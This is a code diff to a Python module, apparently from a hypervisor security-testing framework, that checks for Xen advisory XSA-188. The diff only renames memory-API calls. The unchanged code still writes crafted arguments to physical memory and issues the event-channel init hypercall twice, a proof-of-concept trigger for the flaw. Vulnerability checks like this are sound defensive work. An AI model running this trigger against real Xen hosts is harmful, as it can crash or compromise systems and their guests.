@@ -58,9 +58,9 @@ class xsa188(BaseModule):
 
     def run(self, module_argv):
         self.logger.start_test('Xen XSA-188 PoC check')
-        (args_va, args_pa) = self.cs.mem.alloc_physical_mem(0x1000, 0xFFFFFFFFFFFFFFFF)
+        (args_va, args_pa) = self.cs.hals.Memory.alloc_physical_mem(0x1000, 0xFFFFFFFFFFFFFFFF)
         args = '\xFF' * 8 + '\x00' * 16
-        self.cs.mem.write_physical_mem(args_pa, len(args), args)
+        self.cs.hals.Memory.write_physical_mem(args_pa, len(args), args)
         self.vmm = VMM(self.cs)
         self.vmm.hypercall64_five_args(EVENT_CHANNEL_OP, EVTCHOP_INIT_CONTROL, args_va)
         self.vmm.hypercall64_five_args(EVENT_CHANNEL_OP, EVTCHOP_INIT_CONTROL, args_va)
